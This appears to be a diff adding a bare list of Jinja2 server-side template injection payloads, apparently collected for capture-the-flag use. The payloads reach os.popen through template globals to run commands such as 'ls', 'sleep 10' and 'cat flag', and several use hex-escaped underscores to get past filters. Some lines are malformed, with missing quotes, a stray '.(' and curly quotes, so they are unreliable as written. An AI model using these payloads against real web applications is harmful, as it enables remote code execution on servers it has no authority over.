@@ -1,0 +1,13 @@
+{{ self|attr('\x5fTemplateReference\x5f\x5fcontext')|attr('cycler')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('os')|attr('popen')('ls')|attr('read')() }}
+
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("sleep 10").read()}}
+
+{{self|attr(_TemplateReference__context)|attr(cycler)|attr(__init__)|attr(__globals__)|attr(os)|attr(popen("sleep 10"))|attr(read())}}
+
+{{request.application.__globals__.__getitem__(__builtins__).__getitem__.(__import__('os')).popen('cat flag').read()}} 
+
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
+
+{{request|attr(‘application’)|attr(“\x5f\x5fglobals\x5f\x5f”)|attr(‘\x5f\x5fgetitem\x5f\x5f’)(‘\x5f\x5fbuiltins\x5f\x5f’)|attr(‘\x5f\x5fgetitem\x5f\x5f’)(“\x5f\x5fimport\x5f\x5f”)(‘os’)|attr(‘popen’)(‘cat flag’)|attr(‘read’)()}}
+
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
